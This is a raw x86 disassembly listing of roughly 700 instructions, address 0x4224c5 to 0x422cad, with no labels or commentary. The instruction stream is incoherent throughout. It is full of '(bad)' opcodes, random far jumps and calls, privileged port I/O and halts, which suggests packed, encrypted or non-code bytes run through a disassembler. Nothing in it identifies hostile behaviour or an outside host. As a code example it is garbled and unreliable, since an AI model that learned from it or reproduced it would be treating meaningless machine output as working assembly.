  4224c5:	push   0xa835a054
  4224ca:	sbb    DWORD PTR [ebx-0x3a],ecx
  4224cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ce:	in     eax,dx
  4224cf:	test   al,0x60
  4224d1:	sub    dh,ch
  4224d3:	jl     0x422492
  4224d5:	add    ah,BYTE PTR [ebp+0x2c7ff7a5]
  4224db:	(bad)  
  4224dd:	mov    eax,0x47583332
  4224e2:	add    DWORD PTR [esi+0xc],ebx
  4224e5:	ss repz inc ebx
  4224e8:	mov    BYTE PTR [ebx+0x17],dl
  4224eb:	out    dx,eax
  4224ec:	push   ds
  4224ed:	ins    DWORD PTR es:[edi],dx
  4224ee:	xchg   edi,eax
  4224ef:	shl    BYTE PTR [eax+ebx*8-0x674ff1d6],1
  4224f6:	fwait
  4224f7:	dec    ebx
  4224f8:	mov    bh,0xc7
  4224fa:	enter  0x8853,0x50
  4224fe:	das    
  4224ff:	push   ebx
  422500:	and    al,0x41
  422502:	retf   0x539d
  422505:	jmp    0x8d7a65de
  42250a:	lods   eax,DWORD PTR ds:[esi]
  42250b:	push   0xa23cc09c
  422510:	sub    edx,DWORD PTR [eax+0xdeb7af4]
  422516:	adc    al,BYTE PTR [edx]
  422518:	mov    dh,0xc9
  42251a:	(bad)  
  42251b:	fcomi  st,st(6)
  42251d:	jle    0x422512
  42251f:	gs push 0x297ec302
  422525:	and    DWORD PTR [edi+0x5a],ebp
  422528:	shl    BYTE PTR [edi+eiz*1-0x4dce42b1],1
  42252f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422531:	lds    esp,FWORD PTR [ebp+eax*4+0x654bd35f]
  422538:	jmp    0x4224e2
  42253a:	or     al,0x68
  42253c:	arpl   sp,dx
  42253e:	add    esp,DWORD PTR [edi-0x37]
  422541:	es ja  0x42254b
  422544:	adc    eax,0xaff0c68d
  422549:	fimul  DWORD PTR [edi+0x57]
  42254c:	xor    bh,bl
  42254e:	cs inc ebp
  422550:	xchg   ebp,eax
  422551:	jg     0x422565
  422553:	and    ah,BYTE PTR [edx-0x76]
  422556:	mov    eax,0xbdc82706
  42255b:	push   esp
  42255c:	inc    edx
  42255d:	pop    ecx
  42255e:	(bad)  
  42255f:	push   edx
  422560:	daa    
  422561:	hlt    
  422562:	out    dx,al
  422563:	in     eax,dx
  422564:	xchg   esi,eax
  422565:	rcl    eax,0xe3
  422568:	imul   ecx,DWORD PTR [ecx],0xc0c99b23
  42256e:	jb     0x422570
  422570:	fimul  DWORD PTR [edx]
  422572:	hlt    
  422573:	cmp    al,0xd
  422575:	push   0x7004500d
  42257a:	pop    edi
  42257b:	jge    0x422530
  42257d:	xor    DWORD PTR [edx+0x3f819252],edi
  422583:	fcmovnu st,st(4)
  422585:	mov    ah,BYTE PTR [ebp+0x12061e65]
  42258b:	xchg   ebx,eax
  42258c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42258d:	xchg   ecx,eax
  42258e:	ror    BYTE PTR ds:0x75b92abd,1
  422594:	loopne 0x422544
  422596:	icebp  
  422597:	xchg   esi,eax
  422598:	jne    0x4225b2
  42259a:	xchg   DWORD PTR [ebp+0x3f],ecx
  42259d:	shl    DWORD PTR [eax+0x7a7274e4],cl
  4225a3:	fisubr WORD PTR [edi-0x58]
  4225a6:	mov    ebx,0x7df6b5a8
  4225ab:	addr16 stc 
  4225ad:	push   ss
  4225ae:	out    dx,eax
  4225af:	dec    esi
  4225b0:	jmp    0x9f31:0x2322cc8f
  4225b7:	push   ss
  4225b8:	daa    
  4225b9:	repz jge 0x422565
  4225bc:	shr    BYTE PTR [eax+0x2b108010],0xe
  4225c3:	mov    esp,0x9dbc3260
  4225c8:	shl    DWORD PTR [edi+0x75f32dd6],1
  4225ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225cf:	je     0x422586
  4225d1:	mov    ch,0xe0
  4225d3:	mov    esi,0xa62b2d4a
  4225d8:	or     al,0x50
  4225da:	(bad)  
  4225db:	xchg   DWORD PTR [edi+0x5016d898],edi
  4225e1:	data16 fidiv DWORD PTR [eax+0x5d]
  4225e5:	aaa    
  4225e6:	imul   edi,DWORD PTR [edx],0x7
  4225e9:	sub    al,0xb4
  4225eb:	mov    ecx,0x470d11f8
  4225f0:	or     DWORD PTR [ebp+0x123e4131],0xe91a69e4
  4225fa:	jo     0x4225b2
  4225fc:	pop    ebx
  4225fd:	xchg   ebx,eax
  4225fe:	or     dl,ch
  422600:	dec    edi
  422601:	mov    cr5,ecx
  422604:	out    dx,eax
  422605:	jmp    0xce438c7e
  42260a:	dec    ecx
  42260b:	xchg   ebx,eax
  42260c:	mov    cl,0xdc
  42260e:	add    BYTE PTR ds:0x8b46ff09,0x2e
  422615:	aaa    
  422616:	popa   
  422617:	jno    0x422609
  422619:	mov    ebp,0x75292e96
  42261e:	nop
  42261f:	popa   
  422620:	xchg   esi,ecx
  422622:	xor    DWORD PTR [edi-0xc8e127d],esp
  422628:	loop   0x4225d6
  42262a:	sbb    DWORD PTR [esi+eax*2],esp
  42262d:	popf   
  42262e:	rcl    DWORD PTR [ebx+eiz*1],0xb7
  422632:	(bad)  
  422633:	sti    
  422634:	ret    
  422635:	jmp    0x2b01:0xc669f68f
  42263c:	lods   eax,DWORD PTR ds:[esi]
  42263d:	adc    ch,al
  42263f:	xor    bh,BYTE PTR [esi-0x15c508b2]
  422645:	inc    edx
  422646:	dec    edx
  422647:	retf   
  422648:	into   
  422649:	retf   0x5277
  42264c:	addr16 enter 0xa7e3,0x2
  422651:	push   ebp
  422652:	or     ch,BYTE PTR [edi+0x23]
  422655:	daa    
  422656:	jg     0x4226d2
  422658:	dec    esp
  422659:	daa    
  42265a:	dec    ecx
  42265b:	sub    DWORD PTR [esi],esp
  42265d:	clc    
  42265e:	(bad)  
  422660:	cmc    
  422661:	mov    esp,ebp
  422663:	adc    al,0xbf
  422665:	cmp    di,0x5527
  42266a:	nop
  42266b:	mov    eax,DWORD PTR [esi]
  42266d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42266e:	sbb    eax,0xe7b78b2e
  422673:	leave  
  422674:	sti    
  422675:	pop    eax
  422676:	inc    edi
  422677:	dec    ebp
  422678:	mov    eax,0x44afd3c1
  42267d:	push   cs
  42267e:	lds    ebp,FWORD PTR [eax]
  422680:	mov    al,0x67
  422682:	xchg   ebx,eax
  422683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422684:	mov    cl,0x4e
  422686:	aaa    
  422687:	loope  0x4226c6
  422689:	out    0xa7,al
  42268b:	fimul  DWORD PTR [edi]
  42268d:	rol    DWORD PTR [esi+0xb7a1c7e],cl
  422693:	out    0x5d,eax
  422695:	mov    ah,0x97
  422697:	nop
  422698:	jo     0x422646
  42269a:	fxtract 
  42269c:	loopne 0x42266c
  42269e:	xchg   ebx,eax
  42269f:	cdq    
  4226a0:	mov    esp,0xf535d6ae
  4226a5:	stc    
  4226a6:	lods   al,BYTE PTR ds:[esi]
  4226a7:	add    BYTE PTR [ecx-0x6a],bh
  4226aa:	sub    eax,0x45df3ef6
  4226af:	aam    0x46
  4226b1:	push   edi
  4226b2:	fsubr  DWORD PTR [eax+ebx*2-0x3b5fe615]
  4226b9:	imul   ebp,DWORD PTR [ecx+0x53f13452],0x5d00ca56
  4226c3:	cmp    DWORD PTR [esi],edx
  4226c5:	fwait
  4226c6:	icebp  
  4226c7:	adc    al,0x17
  4226c9:	pusha  
  4226ca:	test   eax,0xba88cab4
  4226cf:	shl    cl,0x92
  4226d2:	repz cmp al,BYTE PTR [edi+esi*8-0x798ee493]
  4226da:	loop   0x4226ea
  4226dc:	or     ebp,ebp
  4226de:	lods   eax,DWORD PTR ds:[esi]
  4226df:	fcom   QWORD PTR ds:0x510a7b2
  4226e5:	jae    0x42275a
  4226e7:	fwait
  4226e8:	sbb    DWORD PTR [edi-0x1a3db39c],edx
  4226ee:	sar    DWORD PTR [esi],0x28
  4226f1:	mov    ecx,0xd163bf52
  4226f6:	push   cs
  4226f7:	ret    
  4226f8:	mov    bl,ch
  4226fa:	clc    
  4226fb:	add    DWORD PTR [esi-0x9e8612c],ebp
  422701:	cdq    
  422702:	das    
  422703:	dec    eax
  422704:	scas   al,BYTE PTR es:[edi]
  422705:	out    dx,eax
  422706:	mov    dh,0x6e
  422708:	shr    BYTE PTR [edx+esi*8],1
  42270b:	mov    dh,0x19
  42270d:	(bad)  
  42270e:	hlt    
  42270f:	inc    edi
  422710:	mov    ebp,0xbdeb7bac
  422715:	test   BYTE PTR [eax-0x9b5e92d],cl
  42271b:	(bad)  
  42271c:	jae    0x422768
  42271e:	and    eax,0x464cda25
  422723:	in     eax,0x5e
  422725:	sub    bl,bh
  422727:	sar    dh,0x76
  42272a:	jnp    0x42270b
  42272c:	mov    es,WORD PTR [edi+0x56cb7629]
  422732:	pusha  
  422733:	lods   eax,DWORD PTR ds:[esi]
  422734:	push   ebp
  422735:	inc    ebx
  422736:	cwde   
  422737:	call   0x391e:0x7743bbdf
  42273e:	push   ds
  42273f:	push   0x415544f
  422744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422745:	pop    ecx
  422746:	stos   BYTE PTR es:[edi],al
  422747:	fwait
  422748:	hlt    
  422749:	push   edi
  42274a:	ss retf 
  42274c:	jnp    0x422761
  42274e:	ret    
  42274f:	call   0xbba1b197
  422754:	add    al,0x43
  422756:	add    al,0xc3
  422758:	inc    ebp
  422759:	jp     0x42272e
  42275b:	shl    DWORD PTR [esi+0x3c4afc75],cl
  422761:	in     al,0x9b
  422763:	or     edi,DWORD PTR [ebp-0x2a]
  422766:	cmp    al,0x16
  422768:	rcr    BYTE PTR [ebp+0x22],1
  42276b:	or     al,dh
  42276d:	push   esp
  42276e:	ret    0x5cc2
  422771:	push   ecx
  422772:	pop    eax
  422773:	push   ss
  422774:	and    bh,bl
  422776:	dec    ecx
  422777:	loopne 0x422703
  422779:	sub    BYTE PTR [esp+ebp*2-0x6eb3fdc3],0x46
  422781:	dec    ebx
  422782:	(bad)  
  422783:	out    0x18,eax
  422785:	es add ebx,0x4f6d32ad
  42278c:	and    dl,BYTE PTR [ebp+0x52c3bd6a]
  422792:	add    DWORD PTR ss:[edi+0x27],0xffffffc1
  422797:	mov    ah,0x68
  422799:	mov    eax,ds:0x503a3495
  42279e:	sahf   
  42279f:	ds or  eax,0xb2e61920
  4227a5:	ins    BYTE PTR es:[edi],dx
  4227a6:	(bad)  
  4227a7:	jl     0x422789
  4227a9:	cs push esi
  4227ab:	sub    edx,edi
  4227ad:	cmp    al,0xfc
  4227af:	call   0xd0ed:0xdaf96d7f
  4227b6:	mov    edx,0x4d49bdc
  4227bb:	and    DWORD PTR [ebx],eax
  4227bd:	lods   eax,DWORD PTR ds:[esi]
  4227be:	cs std 
  4227c0:	sub    al,BYTE PTR [ebx]
  4227c2:	dec    ebp
  4227c3:	inc    edx
  4227c4:	test   BYTE PTR [edx-0x10],al
  4227c7:	dec    edx
  4227c8:	hlt    
  4227c9:	(bad)  
  4227ca:	sbb    al,0x79
  4227cc:	test   ebp,esi
  4227ce:	pop    es
  4227cf:	clc    
  4227d0:	inc    esi
  4227d1:	clc    
  4227d2:	jg     0x42282f
  4227d4:	xchg   BYTE PTR [eax+ebp*1],bl
  4227d7:	aad    0x95
  4227d9:	in     eax,0x67
  4227db:	iret   
  4227dc:	fild   QWORD PTR [edi+ecx*4]
  4227df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227e0:	and    ch,BYTE PTR [esi+0xd]
  4227e3:	and    al,0x6
  4227e5:	push   esi
  4227e6:	es sub al,0x26
  4227e9:	or     eax,0x46fdaecf
  4227ee:	mov    bl,0xd
  4227f0:	jbe    0x422830
  4227f2:	hlt    
  4227f3:	outs   dx,BYTE PTR ds:[esi]
  4227f4:	ror    DWORD PTR [ecx+0x12],1
  4227f7:	jno    0x42277c
  4227f9:	jae    0x422809
  4227fb:	test   eax,0x6b1dcfd8
  422800:	lds    esp,FWORD PTR [edx-0x25]
  422803:	mov    edx,0xeaa4c056
  422808:	scas   al,BYTE PTR es:[edi]
  422809:	adc    eax,eax
  42280b:	addr16 adc eax,0x9881cff8
  422811:	cmp    al,0x82
  422813:	dec    esp
  422814:	xchg   ecx,eax
  422815:	fs jge 0x42285a
  422818:	mov    dl,0xb4
  42281a:	jo     0x422874
  42281c:	xor    esp,ebx
  42281e:	pop    edx
  42281f:	and    dl,BYTE PTR [esi+0x6083fe65]
  422825:	add    DWORD PTR [edi-0x10fe4eb3],0x6eee34c5
  42282f:	popa   
  422830:	sbb    bp,WORD PTR [edi+0x6c]
  422834:	stc    
  422835:	es sub eax,0x7a551f3c
  42283b:	adc    BYTE PTR [edx+0x198ec6b7],bl
  422841:	sbb    BYTE PTR [esi+ebp*1-0x52],ah
  422845:	cmp    al,bh
  422847:	add    eax,0x22f76a75
  42284c:	xor    cl,dl
  42284e:	ror    DWORD PTR [eax-0x511ecffb],cl
  422854:	(bad)  
  422855:	xor    ebx,DWORD PTR [ecx+0x4a]
  422858:	(bad)  
  422859:	nop
  42285a:	pushf  
  42285b:	js     0x4228bc
  42285d:	int3   
  42285e:	mov    al,0x73
  422860:	xchg   esp,eax
  422861:	adc    DWORD PTR [edx+eiz*8+0x10ead9e6],0x22
  422869:	push   ecx
  42286a:	lds    edi,FWORD PTR [esi]
  42286c:	retf   
  42286d:	or     eax,0xfa300ea4
  422872:	push   esp
  422873:	int    0x86
  422875:	dec    ecx
  422876:	iret   
  422877:	xlat   BYTE PTR ds:[ebx]
  422878:	or     BYTE PTR [ebx-0x40749fe9],bl
  42287e:	cld    
  42287f:	fdivr  DWORD PTR ds:[ecx-0x63f63c7b]
  422886:	ins    DWORD PTR es:[edi],dx
  422887:	push   edi
  422888:	adc    al,0xe7
  42288a:	push   ebp
  42288b:	sub    eax,0xca6709ed
  422890:	xchg   ecx,ecx
  422892:	ret    
  422893:	out    0x5a,eax
  422895:	loope  0x42289f
  422897:	das    
  422898:	ins    BYTE PTR es:[edi],dx
  422899:	mov    DWORD PTR ss:[eax],ecx
  42289c:	js     0x42289c
  42289e:	int    0xe5
  4228a0:	adc    ebp,DWORD PTR [ebp+0x2a]
  4228a3:	into   
  4228a4:	jbe    0x422830
  4228a6:	sbb    DWORD PTR [ebp-0x5cb30738],esp
  4228ac:	xor    ecx,edx
  4228ae:	push   edx
  4228af:	(bad)  
  4228b0:	addr16 sbb eax,eax
  4228b3:	mov    edx,0x65a01f0b
  4228b8:	jb     0x42287a
  4228ba:	jmp    0x4438:0xf66289d5
  4228c1:	push   ebx
  4228c2:	fidivr DWORD PTR [edi-0x4b8206ad]
  4228c8:	fldcw  WORD PTR [ebp+0x1a656530]
  4228ce:	push   ecx
  4228cf:	pushf  
  4228d0:	cmp    dh,BYTE PTR [ebx+0x170b436]
  4228d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228d7:	inc    ebx
  4228d8:	in     eax,0xe4
  4228da:	pop    ebx
  4228db:	xor    BYTE PTR [esi],0xea
  4228de:	pusha  
  4228df:	lods   eax,DWORD PTR ds:[esi]
  4228e0:	push   di
  4228e2:	ja     0x42289a
  4228e4:	mov    ebx,0x69cf0be7
  4228e9:	ss (bad) 
  4228eb:	stos   BYTE PTR es:[edi],al
  4228ec:	mov    eax,DWORD PTR [edi-0x7a]
  4228ef:	aad    0xb8
  4228f1:	shl    al,1
  4228f3:	pop    esp
  4228f4:	fisttp QWORD PTR [ebx]
  4228f6:	xchg   ebp,eax
  4228f7:	out    dx,eax
  4228f8:	add    dl,BYTE PTR ds:0xd171f7dd
  4228fe:	jo     0x422917
  422900:	xchg   DWORD PTR [edi+0x7f],ebx
  422903:	cmp    ah,BYTE PTR [bx-0x73a]
  422908:	adc    DWORD PTR [edx],ecx
  42290a:	jnp    0x4228a8
  42290c:	call   0xbce93f3b
  422911:	inc    eax
  422912:	pop    ebp
  422913:	cmp    esi,edi
  422915:	or     DWORD PTR [edx],0x25bd1b19
  42291b:	sub    esi,DWORD PTR ds:0x4db9e38
  422921:	mov    DWORD PTR [ecx-0x5d228efa],edx
  422927:	mov    ebx,0xc055867e
  42292c:	mov    WORD PTR [ebp+0x79327d4e],es
  422932:	jnp    0x4228d0
  422934:	sbb    BYTE PTR [ebp+0xcb73ff3],bh
  42293a:	mov    ch,0x50
  42293c:	in     eax,dx
  42293d:	call   0xf8a0:0x7c3424c3
  422944:	inc    edx
  422945:	sub    bh,BYTE PTR [edx]
  422947:	cmp    DWORD PTR [ecx-0x7d],ecx
  42294a:	xchg   ebp,eax
  42294b:	jle    0x4229b2
  42294d:	(bad)  
  42294e:	fiadd  WORD PTR [edx+0x170bd2fb]
  422954:	loopne 0x42290f
  422956:	sub    al,BYTE PTR [ecx-0xa795940]
  42295c:	jmp    0x4c11:0x81e79a18
  422963:	and    ah,BYTE PTR [eax-0x629aae2b]
  422969:	ret    0x439
  42296c:	imul   eax,DWORD PTR [ebp+0x4bf05102],0xffffffc1
  422973:	(bad)  
  422974:	or     al,0xd4
  422976:	xor    esi,ebx
  422978:	and    edx,esi
  42297a:	inc    edi
  42297b:	int3   
  42297c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42297d:	jns    0x4229d9
  42297f:	pusha  
  422980:	and    DWORD PTR [ebx+0x8],0x5c
  422984:	cmc    
  422985:	inc    eax
  422986:	mov    ah,bh
  422988:	stos   BYTE PTR es:[edi],al
  422989:	mov    bl,0x68
  42298b:	xchg   al,ah
  42298d:	mov    al,ds:0xb416e983
  422992:	lock jmp 0x43280e39
  422998:	inc    ebx
  422999:	sar    DWORD PTR [edi],0x54
  42299c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42299e:	popf   
  42299f:	(bad)  
  4229a0:	ret    0x6cf8
  4229a3:	cld    
  4229a4:	mov    esi,0x150e6b54
  4229a9:	jmp    0x422996
  4229ab:	test   al,0xea
  4229ad:	jo     0x4229c5
  4229af:	cld    
  4229b0:	out    0x6a,eax
  4229b2:	jecxz  0x4229be
  4229b4:	fstp   QWORD PTR [eax]
  4229b6:	cmp    DWORD PTR [eax+0x351d0ba7],edx
  4229bc:	popf   
  4229bd:	retf   
  4229be:	push   0x79
  4229c0:	stc    
  4229c1:	hlt    
  4229c2:	adc    eax,0x9c3a1713
  4229c7:	shl    BYTE PTR ds:0x6cc5e622,cl
  4229cd:	mov    dl,dl
  4229cf:	or     BYTE PTR [esp+esi*4+0x45f79574],al
  4229d6:	push   ss
  4229d7:	sub    dh,al
  4229d9:	xor    eax,0xbf878feb
  4229de:	les    esi,FWORD PTR [edx]
  4229e0:	xlat   BYTE PTR ds:[ebx]
  4229e1:	cmp    ebp,DWORD PTR [eax+0x2b9049e1]
  4229e7:	cmp    BYTE PTR [eax+esi*1-0x14fe6409],dl
  4229ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229ef:	cmp    DWORD PTR [ebx],0x10
  4229f2:	mov    ebp,0xbbb5fd5b
  4229f7:	and    esp,DWORD PTR [eax+0x7e]
  4229fa:	push   esi
  4229fb:	fiadd  WORD PTR [ebp-0x762c2e73]
  422a01:	inc    ecx
  422a02:	xchg   edx,eax
  422a03:	dec    ecx
  422a04:	stc    
  422a05:	mov    ds:0x655a6f8d,al
  422a0a:	mov    al,ds:0x88c19217
  422a0f:	mov    ch,0x71
  422a11:	add    al,0x47
  422a13:	inc    eax
  422a14:	xor    ebp,esp
  422a16:	enter  0x1610,0x3c
  422a1a:	out    dx,al
  422a1b:	das    
  422a1c:	mov    ch,0x8f
  422a1e:	mov    esi,0x6fdfa845
  422a23:	lods   eax,DWORD PTR ds:[esi]
  422a24:	scas   al,BYTE PTR es:[edi]
  422a25:	add    BYTE PTR [eax+0x78ef56b6],0x7d
  422a2c:	hlt    
  422a2d:	xor    bl,cl
  422a2f:	icebp  
  422a30:	xchg   ecx,eax
  422a31:	push   edx
  422a32:	adc    edi,DWORD PTR ds:0x99733178
  422a38:	ret    0x1045
  422a3b:	xchg   BYTE PTR [esi+0x5a51063d],ah
  422a41:	push   esi
  422a42:	mov    ebx,0x9b6e92ef
  422a47:	or     al,0xce
  422a49:	sbb    DWORD PTR [edi],edi
  422a4b:	shr    BYTE PTR ds:0x12e37c2b,cl
  422a51:	sbb    eax,0x22e1f583
  422a56:	das    
  422a57:	xor    dl,cl
  422a59:	push   es
  422a5a:	push   eax
  422a5b:	dec    ebp
  422a5c:	cmp    ecx,DWORD PTR [esi+0x736f51b]
  422a62:	je     0x422a80
  422a64:	or     BYTE PTR [ebp+0x5a6b1b31],cl
  422a6a:	mov    al,0x92
  422a6c:	adc    edx,ecx
  422a6e:	popa   
  422a6f:	inc    edi
  422a70:	enter  0x79ed,0x70
  422a74:	jp     0x422a5f
  422a76:	push   esi
  422a77:	sbb    cl,BYTE PTR [ecx+0x2fa5847f]
  422a7d:	sub    bh,BYTE PTR [edx]
  422a7f:	pop    ebp
  422a80:	adc    al,BYTE PTR [edx-0x72bf30a7]
  422a86:	jb     0x422a7c
  422a88:	scas   al,BYTE PTR es:[edi]
  422a89:	inc    eax
  422a8a:	sbb    al,0xe7
  422a8c:	lods   al,BYTE PTR ds:[esi]
  422a8d:	sbb    al,0xf9
  422a8f:	xlat   BYTE PTR ds:[ebx]
  422a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a91:	into   
  422a92:	and    esi,DWORD PTR [eax-0x63]
  422a95:	xlat   BYTE PTR ds:[ebx]
  422a96:	nop
  422a97:	mov    ebp,0x6f2308eb
  422a9c:	xchg   ebp,eax
  422a9d:	mov    BYTE PTR [edi+eiz*8+0x71],0x4c
  422aa2:	push   eax
  422aa3:	push   ebx
  422aa4:	mov    al,0xd9
  422aa6:	lods   al,BYTE PTR ds:[esi]
  422aa7:	xchg   ebx,eax
  422aa8:	adc    ah,bh
  422aaa:	pop    es
  422aab:	xor    BYTE PTR [edi],al
  422aad:	retf   0xc437
  422ab0:	or     al,0x54
  422ab2:	jge    0x422ab3
  422ab4:	mov    dh,0x18
  422ab6:	pop    edi
  422ab7:	jg     0x422a7c
  422ab9:	and    eax,0xc579b0ed
  422abe:	jle    0x422b3e
  422ac0:	mov    ds:0x8278762,al
  422ac5:	in     eax,0x7b
  422ac7:	mov    bl,0x7d
  422ac9:	sbb    al,BYTE PTR [ebp+0x27e643ff]
  422acf:	dec    esp
  422ad0:	mov    ah,al
  422ad2:	lock inc eax
  422ad4:	pop    edx
  422ad5:	adc    BYTE PTR [ebx],ah
  422ad7:	jbe    0x422af9
  422ad9:	fs pop eax
  422adb:	test   BYTE PTR [edi-0x79],al
  422ade:	add    cl,BYTE PTR [eax+esi*1]
  422ae1:	imul   eax,DWORD PTR [edx],0x6e
  422ae4:	fist   DWORD PTR [ecx+0x7992f635]
  422aea:	inc    ecx
  422aeb:	outs   dx,DWORD PTR ds:[esi]
  422aec:	out    0xf0,al
  422aee:	sbb    al,0xbf
  422af0:	push   edi
  422af1:	add    al,0x25
  422af3:	xor    eax,0x97173838
  422af8:	inc    edi
  422af9:	jl     0x422a9b
  422afb:	adc    DWORD PTR [edi+eiz*2],ebx
  422afe:	into   
  422aff:	mov    cl,0x26
  422b01:	mov    ecx,0x217ad52e
  422b06:	xchg   edx,eax
  422b07:	inc    ecx
  422b08:	mov    ecx,0xdbbd315a
  422b0d:	push   edi
  422b0e:	push   esi
  422b0f:	les    ebp,FWORD PTR [eax+eax*4+0x2acb7307]
  422b16:	adc    eax,edx
  422b18:	loopne 0x422b2f
  422b1a:	pop    ebx
  422b1b:	jmp    0xec7d:0x7bb90446
  422b22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b23:	ret    
  422b24:	test   DWORD PTR [ebp-0x425ea0a6],edi
  422b2a:	retf   0xa577
  422b2d:	retf   0xa07f
  422b30:	pop    ecx
  422b31:	loop   0x422b4e
  422b33:	cwde   
  422b34:	cmp    eax,0xbe4d647c
  422b39:	dec    ecx
  422b3a:	arpl   di,dx
  422b3c:	or     cl,BYTE PTR [ebx+0xb]
  422b3f:	mov    eax,ds:0x450cfc0d
  422b44:	pushf  
  422b45:	popa   
  422b46:	xchg   edx,eax
  422b47:	imul   DWORD PTR [ebx+0x31bb9505]
  422b4d:	(bad)
  422b50:	add    edx,DWORD PTR [ebx]
  422b52:	out    dx,eax
  422b53:	dec    ebx
  422b54:	mov    BYTE PTR [ecx+0xcfbddad],ch
  422b5a:	(bad)  
  422b5b:	nop
  422b5c:	or     ecx,DWORD PTR [ebx-0x17]
  422b5f:	jmp    0x422b4b
  422b61:	aad    0x2a
  422b63:	(bad)  
  422b64:	jmp    0x3289:0xf38df9cc
  422b6b:	mov    WORD PTR [esi-0x57ea929e],fs
  422b71:	arpl   bx,bp
  422b73:	sbb    eax,0x48f875fa
  422b78:	jge    0x422b0e
  422b7a:	cdq    
  422b7b:	scas   eax,DWORD PTR es:[edi]
  422b7c:	inc    esp
  422b7d:	inc    al
  422b7f:	imul   ebp,DWORD PTR [ebp+0x26563740],0x30be314e
  422b89:	pushfw 
  422b8b:	sub    esi,0x62b35f05
  422b91:	mov    ds,WORD PTR [eax]
  422b93:	pop    ebp
  422b94:	fcmovbe st,st(5)
  422b96:	shl    DWORD PTR [ebx+0x33],0x59
  422b9a:	sbb    eax,0xe4757c6a
  422b9f:	cdq    
  422ba0:	push   edx
  422ba1:	(bad)  
  422ba2:	out    dx,eax
  422ba3:	xchg   ebx,eax
  422ba4:	retf   0xf3ad
  422ba7:	in     eax,dx
  422ba8:	stc    
  422ba9:	pop    es
  422baa:	sbb    esp,esp
  422bac:	pop    ss
  422bad:	push   eax
  422bae:	(bad)  
  422baf:	sbb    esp,edx
  422bb1:	push   ecx
  422bb2:	leave  
  422bb3:	pop    ebp
  422bb4:	jmp    0x422ba7
  422bb6:	das    
  422bb7:	popa   
  422bb8:	fnstenv [esi-0x3d]
  422bbb:	push   ecx
  422bbc:	add    BYTE PTR ds:0x26ad5d5c,bl
  422bc2:	lahf   
  422bc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bc4:	pusha  
  422bc5:	sub    al,0xae
  422bc7:	sbb    dh,BYTE PTR [ebx-0x6f]
  422bca:	sar    DWORD PTR [edi],0xca
  422bcd:	enter  0x5760,0xa
  422bd1:	and    ebx,ebx
  422bd3:	mov    ds:0x6beda5f3,eax
  422bd8:	(bad)  
  422bd9:	ins    DWORD PTR es:[edi],dx
  422bda:	adc    edx,edi
  422bdc:	xchg   ecx,eax
  422bdd:	lds    edx,FWORD PTR [edx]
  422bdf:	jge    0x422bbb
  422be1:	and    DWORD PTR [edx+0x43],ecx
  422be4:	lods   eax,DWORD PTR ds:[esi]
  422be5:	dec    ecx
  422be6:	and    BYTE PTR [edx],ah
  422be8:	push   ebx
  422be9:	out    0x3f,al
  422beb:	int    0x8e
  422bed:	inc    edi
  422bee:	into   
  422bef:	cmp    al,0xc2
  422bf1:	or     eax,0xacdafce5
  422bf6:	ja     0x422c01
  422bf8:	hlt    
  422bf9:	test   BYTE PTR [ebx-0xd],bl
  422bfc:	pop    ecx
  422bfd:	xor    ecx,DWORD PTR [ebp+0x57]
  422c00:	rol    DWORD PTR [ebp-0x4562ce55],cl
  422c06:	push   cs
  422c07:	fsubr  DWORD PTR [esi-0x12]
  422c0a:	jp     0x422c12
  422c0c:	dec    ebp
  422c0d:	retf   
  422c0e:	imul   esp,ecx,0x5dbf888c
  422c14:	push   ebx
  422c15:	push   ds
  422c16:	mov    WORD PTR [edi],cs
  422c18:	push   ebx
  422c19:	int    0x10
  422c1b:	mov    dh,BYTE PTR [ebx]
  422c1d:	xlat   BYTE PTR ds:[ebx]
  422c1e:	and    DWORD PTR [edx-0x51],esi
  422c21:	shl    DWORD PTR [ebx-0x5e],1
  422c24:	lock pop ebx
  422c26:	pop    es
  422c27:	je     0x422c06
  422c29:	test   DWORD PTR [ebx],edi
  422c2b:	xchg   ecx,eax
  422c2c:	jo     0x422c64
  422c2e:	into   
  422c2f:	mov    edi,0x1a43151c
  422c34:	pop    edx
  422c35:	jmp    0xcb99:0xfe2027b
  422c3c:	pop    edi
  422c3d:	mov    ds:0x2a6db858,al
  422c42:	jb     0x422cb5
  422c44:	mov    edi,0x1236f44d
  422c49:	xchg   BYTE PTR [esi],ch
  422c4b:	pop    esi
  422c4c:	xchg   DWORD PTR [esi-0x335b2f84],eax
  422c52:	adc    eax,0x8934db0e
  422c57:	and    eax,DWORD PTR [edi+0x4782ac02]
  422c5d:	es inc ebp
  422c5f:	iret   
  422c60:	or     BYTE PTR [edi-0x6b717b97],cl
  422c66:	dec    esi
  422c67:	repz adc al,0x42
  422c6a:	fcomip st,st(1)
  422c6c:	inc    ecx
  422c6d:	(bad)  
  422c6e:	cmp    BYTE PTR [edx+edx*8-0x4524cbc8],dh
  422c75:	and    DWORD PTR [esi-0x5330b91b],eax
  422c7b:	sbb    DWORD PTR [edx-0x53],esi
  422c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c7f:	mov    WORD PTR [ecx+eiz*8-0x22],ss
  422c83:	loopne 0x422c98
  422c85:	xor    eax,0xa36ce86b
  422c8a:	jns    0x422c3e
  422c8c:	jmp    0x422d04
  422c8e:	jno    0x422ca0
  422c90:	adc    DWORD PTR [edi-0x6b],0x7b2e12d7
  422c97:	(bad)
  422c9a:	jmp    0xe897:0x23d4b65
  422ca1:	data16 fwait
  422ca3:	arpl   dx,si
  422ca5:	nop
  422ca6:	xor    ah,ch
  422ca8:	cmc    
  422ca9:	mov    bl,0x2
  422cab:	mov    ah,0xef
  422cad:	ret    
